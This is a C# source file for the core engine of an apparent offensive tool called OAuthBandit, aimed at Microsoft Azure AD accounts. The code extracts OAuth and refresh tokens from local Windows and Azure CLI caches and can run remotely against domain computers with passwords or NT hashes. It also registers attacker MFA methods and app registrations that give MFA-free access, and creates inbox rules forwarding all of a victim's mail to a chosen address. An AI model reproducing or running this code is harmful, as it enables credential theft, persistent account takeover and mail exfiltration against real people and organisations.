using System.Text.Json;
using OAuthBandit.Extractors;
using OAuthBandit.Mfa;
using OAuthBandit.Remote;

namespace OAuthBandit.Core;

public class BanditEngine
{
    private static readonly Random _rng = new();
    private string _mode;
    private readonly string _hostname;
    private readonly string _username;
    private readonly OutputManager _outputManager;
    private readonly List<Token> _tokens = new();

    public BanditEngine(string mode = "local")
    {
        _mode = mode;
        _hostname = Environment.GetEnvironmentVariable("COMPUTERNAME") ?? "Unknown";
        _username = Environment.GetEnvironmentVariable("USERNAME") ?? "Unknown";
        _outputManager = new OutputManager(_hostname, _username);
    }

    public void PrintBanner()
    {
        var modeStr = _mode == "local" ? "LOCAL" : "REMOTE";
        Console.WriteLine();
        Console.WriteLine("    ╔═╗╔═╗╦ ╦╔╦╗╦ ╦  ╔╗ ╔═╗╔╗╔╔╦╗╦╔╦╗");
        Console.WriteLine("    ║ ║╠═╣║ ║ ║ ╠═╣  ╠╩╗╠═╣║║║ ║║║ ║ ");
        Console.WriteLine("    ╚═╝╩ ╩╚═╝ ╩ ╩ ╩  ╚═╝╩ ╩╝╚╝═╩╝╩ ╩ ");
        Console.WriteLine($"                       [{modeStr}]");
        Console.WriteLine();
    }

    public List<Token> RunLocal(string outputDir = ".", bool autoMfa = false, bool validate = false)
    {
        PrintBanner();

        Console.WriteLine("  # tbres cache");
        var tbres = new TBResExtractor();
        var tbresTokens = tbres.Extract();
        Console.WriteLine($"    = {tbresTokens.Count} tokens\n");
        _tokens.AddRange(tbresTokens);

        Thread.Sleep(_rng.Next(80, 250));

        Console.WriteLine("  # wam cache");
        var wam = new WAMExtractor();
        var wamTokens = wam.Extract();
        var ngcCount = wamTokens.Count(t => t.TokenType == "ngc_token");
        var wamLabel = ngcCount > 0 ? $"{wamTokens.Count} tokens ({ngcCount} ngc)" : $"{wamTokens.Count} tokens";
        Console.WriteLine($"    = {wamLabel}\n");
        _tokens.AddRange(wamTokens);

        Thread.Sleep(_rng.Next(50, 200));

        Console.WriteLine("  # azure cli / powershell cache");
        var azCli = new AzureCliExtractor();
        var azTokens = azCli.Extract();
        var azRt = azTokens.Count(t => t.TokenType == "refresh_token");
        var azLabel = azRt > 0 ? $"{azTokens.Count} tokens ({azRt} refresh)" : $"{azTokens.Count} tokens";
        Console.WriteLine($"    = {azLabel}\n");
        _tokens.AddRange(azTokens);

        if (_tokens.Count > 0)
        {
            _outputManager.PrintStatistics(_tokens);
            _outputManager.Export(_tokens, outputDir);

            if (validate) RunValidation();
            if (autoMfa) RunMfaPersistence(outputDir);
        }
        else
        {
            Console.WriteLine("\n  ! nothing found");
        }

        Console.WriteLine("  done.");
        return _tokens;
    }

    private void RunValidation()
    {
        var validator = new TokenValidator();
        validator.ValidateAll(_tokens);
    }

    private void RunMfaPersistence(string outputDir)
    {
        if (_tokens.Count == 0)
        {
            Console.WriteLine("\n  no tokens for mfa");
            return;
        }

        Console.WriteLine("\n  # mfa persistence");

        var mfa = new MfaManager(outputDir);
        mfa.ProcessAllTokens(_tokens);
    }

    public void RunRemote(string dcIp, string domain, string username,
        string? password = null, string? nthash = null, int threads = 10,
        List<string>? targetComputers = null, string outputDir = ".",
        bool autoMfa = false, double mfaDelay = 2.0, int retry = 1)
    {
        _mode = "remote";

        var executor = new RemoteExecutor(dcIp, domain, username, password, nthash,
            threads, outputDir, autoMfa, mfaDelay, retry);

        executor.Run(targetComputers);
        executor.Cleanup();
        Console.WriteLine("  done.");
    }

    public void RunMfaStandalone(List<string>? tokens = null, string? tokenFile = null,
        string tenantId = "common", string outputDir = ".")
    {
        _mode = "mfa";

        PrintBanner();
        Console.WriteLine("  # mfa mode (totp + tap)");

        var allTokens = new List<string>();
        if (tokens != null) allTokens.AddRange(tokens);

        if (tokenFile != null)
        {
            try
            {
                foreach (var line in File.ReadAllLines(tokenFile))
                {
                    var trimmed = line.Trim();
                    if (!string.IsNullOrEmpty(trimmed) && !trimmed.StartsWith('#'))
                        allTokens.Add(trimmed);
                }
                Console.WriteLine($"  ~ loaded {allTokens.Count} token(s) from {tokenFile}");
            }
            catch (FileNotFoundException) { Console.WriteLine($"  file not found: {tokenFile}"); return; }
            catch (Exception ex) { Console.WriteLine($"  read error: {ex.Message}"); return; }
        }

        if (allTokens.Count == 0)
        {
            Console.WriteLine("  no tokens provided (use --token or --tokenfile)");
            return;
        }

        Console.WriteLine($"  ~ processing {allTokens.Count} token(s), tenant={tenantId}");

        var mfa = new MfaManager(outputDir);

        var rtTokens = new List<string>();
        int skipped = 0;
        foreach (var t in allTokens)
        {
            if (t.StartsWith("eyJ")) skipped++;
            else rtTokens.Add(t);
        }

        if (skipped > 0)
            Console.WriteLine($"  skipped {skipped} access token(s) - need refresh tokens");

        if (rtTokens.Count == 0)
        {
            Console.WriteLine("  no refresh tokens in input");
            return;
        }

        for (int i = 0; i < rtTokens.Count; i++)
        {
            Console.WriteLine($"\n  # RT {i + 1}/{rtTokens.Count}");

            // pre-validate: exchange + check rights before doing anything
            var preCheck = PreValidateRT(rtTokens[i], tenantId, new[] { "mfa_methods" });
            if (preCheck == null) continue;

            if (preCheck.Value.caps.ContainsKey("mfa_methods") && preCheck.Value.caps["mfa_methods"].StartsWith("no"))
                Console.WriteLine($"    ! mfa methods not accessible - totp reg may fail");

            mfa.ProcessRefreshToken(rtTokens[i], $"token_{i + 1}", tenantId);
        }

        if (mfa.Results.Count > 0) mfa.ExportResults();
        Console.WriteLine("\n  done.");
    }

    public void RunAppRegister(List<string>? tokens = null, string? tokenFile = null,
        string tenantId = "common", string outputDir = ".")
    {
        _mode = "app-reg";

        PrintBanner();
        Console.WriteLine("  # app registration mode");

        var allTokens = new List<string>();
        if (tokens != null) allTokens.AddRange(tokens);

        if (tokenFile != null)
        {
            try
            {
                foreach (var line in File.ReadAllLines(tokenFile))
                {
                    var trimmed = line.Trim();
                    if (!string.IsNullOrEmpty(trimmed) && !trimmed.StartsWith('#'))
                        allTokens.Add(trimmed);
                }
                Console.WriteLine($"  ~ loaded {allTokens.Count} token(s) from {tokenFile}");
            }
            catch (FileNotFoundException) { Console.WriteLine($"  file not found: {tokenFile}"); return; }
        }

        if (allTokens.Count == 0)
        {
            Console.WriteLine("  no tokens provided (use --token or --tokenfile)");
            return;
        }

        var rtTokens = allTokens.Where(t => !t.StartsWith("eyJ")).ToList();
        int skipped = allTokens.Count - rtTokens.Count;
        if (skipped > 0) Console.WriteLine($"  skipped {skipped} access token(s)");

        if (rtTokens.Count == 0)
        {
            Console.WriteLine("  no refresh tokens found");
            return;
        }

        var results = new List<Dictionary<string, object?>>();

        for (int i = 0; i < rtTokens.Count; i++)
        {
            Console.WriteLine($"\n  # token {i + 1}/{rtTokens.Count}");

            // pre-validate: exchange + check app reg rights
            var preCheck = PreValidateRT(rtTokens[i], tenantId, new[] { "app_reg" });
            if (preCheck == null) continue;

            if (preCheck.Value.caps.ContainsKey("app_reg") && preCheck.Value.caps["app_reg"] == "blocked")
            {
                Console.WriteLine($"    ! app registration blocked by tenant policy - skipping");
                results.Add(new() { ["status"] = "failed", ["error"] = "App registration blocked by policy" });
                continue;
            }

            Console.WriteLine($"    exchanging for graph access...");
            var exchanger = new TokenExchangeService(tenantId);
            var exchangeResult = exchanger.TryFociExchange(rtTokens[i]);

            if (!exchangeResult.HasValue)
            {
                Console.WriteLine("    exchange failed");
                results.Add(new() { ["status"] = "failed", ["error"] = "Token exchange failed" });
                continue;
            }

            var (clientName, tokenResp) = exchangeResult.Value;
            string upn = "unknown";

            try
            {
                var totpTmp = new TotpRegister(tokenResp.AccessToken);
                var userInfo = totpTmp.GetCurrentUser();
                if (userInfo != null && userInfo.Value.TryGetProperty("userPrincipalName", out var u))
                    upn = u.GetString() ?? "unknown";
            }
            catch { }

            Console.WriteLine($"    ~ exchanged via {clientName} for {upn}");

            Console.WriteLine($"    checking registration rights...");
            var appReg = new AppRegisterService(tokenResp.AccessToken);
            var rightsCheck = appReg.CheckCanRegister();

            if (rightsCheck["can_register"] is false)
            {
                Console.WriteLine("    ! user cant register apps on this tenant");
                results.Add(new()
                {
                    ["account"] = upn, ["status"] = "failed",
                    ["rights_check"] = rightsCheck, ["error"] = rightsCheck["reason"]
                });
                continue;
            }

            Console.WriteLine("    registering app...");
            var app = appReg.RegisterApp();
            if (app != null)
            {
                results.Add(new()
                {
                    ["account"] = upn, ["status"] = "success",
                    ["rights_check"] = rightsCheck, ["app_registration"] = app.ToDict()
                });
            }
            else
            {
                results.Add(new()
                {
                    ["account"] = upn, ["status"] = "failed",
                    ["rights_check"] = rightsCheck,
                    ["error"] = "App creation API call failed"
                });
            }
        }

        // Export
        if (results.Count > 0)
        {
            var exportDir = Path.Combine(outputDir, "export");
            Directory.CreateDirectory(exportDir);
            var timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
            var filename = Path.Combine(exportDir, $"app_registrations_{timestamp}.json");

            int successCount = results.Count(r => r.TryGetValue("status", out var s) && s?.ToString() == "success");

            var output = new Dictionary<string, object?>
            {
                ["_description"] = "OAuthBandit - Azure AD App Registrations",
                ["metadata"] = new Dictionary<string, object?>
                {
                    ["generated_at"] = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ"),
                    ["tool"] = "OAuthBandit", ["module"] = "App Registration", ["version"] = "2.0.0"
                },
                ["prerequisites"] = new Dictionary<string, object?>
                {
                    ["required"] = "Refresh token from a user who can register apps",
                    ["conditions"] = new[] {
                        "Tenant policy: defaultUserRolePermissions.allowedToCreateApps = true",
                        "OR user has role: Global Administrator / Application Administrator / Cloud Application Administrator"
                    },
                    ["note"] = "Admin consent for API permissions requires Global Admin or Privileged Role Admin"
                },
                ["summary"] = new Dictionary<string, object?>
                {
                    ["tokens_processed"] = rtTokens.Count,
                    ["apps_registered"] = successCount,
                    ["failed"] = results.Count - successCount
                },
                ["how_to_use"] = new Dictionary<string, string>
                {
                    ["description"] = "Use client_id + client_secret to authenticate as the app (no user needed, no MFA)",
                    ["token_endpoint"] = "https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token",
                    ["grant_type"] = "client_credentials",
                    ["scope"] = "https://graph.microsoft.com/.default"
                },
                ["registrations"] = results
            };

            File.WriteAllText(filename, JsonSerializer.Serialize(output, new JsonSerializerOptions { WriteIndented = true }));
            Console.WriteLine($"\n  ~ saved: {filename}");
        }

        Console.WriteLine("\n  done.");
    }

    // mail forwarding mode - create inbox rule to redirect all mail
    public void RunMailRedirect(List<string>? tokens = null, string? tokenFile = null,
        string tenantId = "common", string targetEmail = "", string outputDir = ".")
    {
        _mode = "mail-fwd";

        PrintBanner();
        Console.WriteLine("  # mail redirect mode");
        Console.WriteLine($"    target: {targetEmail}\n");

        var allTokens = new List<string>();
        if (tokens != null) allTokens.AddRange(tokens);

        if (tokenFile != null)
        {
            try
            {
                foreach (var line in File.ReadAllLines(tokenFile))
                {
                    var trimmed = line.Trim();
                    if (!string.IsNullOrEmpty(trimmed) && !trimmed.StartsWith('#'))
                        allTokens.Add(trimmed);
                }
                Console.WriteLine($"  ~ loaded {allTokens.Count} token(s) from {tokenFile}");
            }
            catch (FileNotFoundException) { Console.WriteLine($"  ! file not found: {tokenFile}"); return; }
        }

        if (allTokens.Count == 0)
        {
            Console.WriteLine("  ! no tokens provided (use --token or --tokenfile)");
            return;
        }

        var rtTokens = allTokens.Where(t => !t.StartsWith("eyJ")).ToList();
        if (rtTokens.Count == 0)
        {
            Console.WriteLine("  ! no refresh tokens found");
            return;
        }

        int success = 0;
        for (int i = 0; i < rtTokens.Count; i++)
        {
            Console.WriteLine($"\n  # RT {i + 1}/{rtTokens.Count}");

            // pre-validate: exchange + check mail access
            var preCheck = PreValidateRT(rtTokens[i], tenantId, new[] { "mail" });
            if (preCheck == null) continue;

            if (preCheck.Value.caps.ContainsKey("mail") && preCheck.Value.caps["mail"].StartsWith("no"))
            {
                Console.WriteLine($"    ! mail access denied - cant create rule");
                continue;
            }

            Console.WriteLine($"    creating inbox forward rule...");
            var redirector = new MailRedirect(preCheck.Value.accessToken);

            // list existing rules
            var existing = redirector.ListExistingRules();
            if (existing.Count > 0)
                Console.WriteLine($"    ~ {existing.Count} existing rule(s)");

            var (ok, ruleId, error) = redirector.CreateForwardRule(targetEmail);
            if (ok)
            {
                success++;
                Console.WriteLine($"    + rule created (id={ruleId})");
                Console.WriteLine($"      all mail now forwarded to {targetEmail}");
            }
            else
            {
                Console.WriteLine($"    ! rule creation failed: {error}");
            }
        }

        Console.WriteLine($"\n  ~ mail redirect: {success}/{rtTokens.Count} successful");
        Console.WriteLine("  done.");
    }

    // pre-validate a refresh token: foci exchange + identity check + specific probes
    // returns null if token is dead, otherwise the AT + user + capabilities
    private (string accessToken, string upn, Dictionary<string, string> caps)? PreValidateRT(
        string refreshToken, string tenantId, string[] checks)
    {
        Console.WriteLine($"    validating token...");
        var exchanger = new TokenExchangeService(tenantId);
        var exchangeResult = exchanger.TryFociExchange(refreshToken);

        if (!exchangeResult.HasValue)
        {
            Console.WriteLine($"    ! token exchange failed - skipping");
            return null;
        }

        var (clientName, tokenResp) = exchangeResult.Value;
        var at = tokenResp.AccessToken;
        Console.WriteLine($"    ~ exchanged via {clientName}");

        // check /me
        var graph = new GraphClient(at);
        var me = graph.Get("https://graph.microsoft.com/v1.0/me?$select=displayName,userPrincipalName,mail");
        if (me == null)
        {
            Console.WriteLine($"    ! /me call failed - token may be invalid");
            return null;
        }

        string upn = "unknown";
        if (me.Value.TryGetProperty("userPrincipalName", out var u))
            upn = u.GetString() ?? "unknown";
        string displayName = "";
        if (me.Value.TryGetProperty("displayName", out var dn))
            displayName = dn.GetString() ?? "";

        Console.WriteLine($"    ~ identity: {displayName} <{upn}>");

        var caps = new Dictionary<string, string>();

        // specific probes based on what the caller needs
        foreach (var check in checks)
        {
            Thread.Sleep(_rng.Next(50, 150));

            switch (check)
            {
                case "mfa_methods":
                    var mfaResp = graph.GetDetailed("https://graph.microsoft.com/v1.0/me/authentication/methods");
                    caps["mfa_methods"] = mfaResp.statusCode == 200 ? "accessible" : $"no ({mfaResp.statusCode})";
                    Console.WriteLine($"    ~ mfa methods: {caps["mfa_methods"]}");
                    break;

                case "app_reg":
                    var polResp = graph.GetDetailed("https://graph.microsoft.com/v1.0/policies/authorizationPolicy");
                    if (polResp.statusCode == 200 && polResp.result != null)
                    {
                        var body = polResp.result.Value.ToString();
                        bool canReg = body.Contains("allowedToCreateApps") &&
                                     (body.Contains("\"allowedToCreateApps\":true") || body.Contains("\"allowedToCreateApps\": true"));
                        caps["app_reg"] = canReg ? "allowed" : "blocked";
                    }
                    else
                        caps["app_reg"] = $"unknown ({polResp.statusCode})";
                    Console.WriteLine($"    ~ app registration: {caps["app_reg"]}");
                    break;

                case "mail":
                    var mailResp = graph.GetDetailed("https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules");
                    caps["mail"] = mailResp.statusCode == 200 ? "accessible" : $"no ({mailResp.statusCode})";
                    Console.WriteLine($"    ~ mail rules: {caps["mail"]}");
                    break;
            }
        }

        return (at, upn, caps);
    }
}
